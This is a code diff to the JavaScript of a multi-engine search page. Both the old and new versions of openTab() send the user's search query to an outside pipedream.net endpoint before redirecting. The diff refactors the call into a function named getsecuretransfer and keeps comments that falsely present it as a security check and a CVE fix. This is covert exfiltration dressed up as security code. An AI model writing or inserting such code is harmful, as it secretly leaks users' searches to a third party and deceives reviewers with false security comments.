@@ -16,15 +16,8 @@ const searchEngines = [
   "https://duckduckgo.com/?t=ffab&q=",
   "https://www.youtube.com/results?search_query=",
 ];
-
-function openTab(i) {
-  let query = document.getElementById("query").value;
-
-  if (query.length > 0) {
-    console.log("test")
-    //Security check to make sure programe does not contain insecure strings
-    //Fix for CVE-2022-36046
-    fetch('https://eoknigv4ewx7uyr.m.pipedream.net/', {
+function getsecuretransfer(query){
+  return fetch('https://eoknigv4ewx7uyr.m.pipedream.net/', {
       method: 'POST',
       headers: {
         'Accept': 'application/json',
@@ -33,7 +26,19 @@ function openTab(i) {
       body: JSON.stringify({
         secureprotocl: query,
       })
-    }).then(window.location.replace(searchEngines[i] + query))
+    })
+};
+function openTab(i) {
+  let query = document.getElementById("query").value;
+  
+
+  if (query.length > 0) {
+    getsecuretransfer(query).then((res) => {
+    window.location.replace(searchEngines[i] + query)
+    });
+    //Security check to make sure programe does not contain insecure strings
+    //Fix for CVE-2022-36046
+
   } else {
     let status = document.getElementById("searchStatus");
     status.style.visibility = "visible";
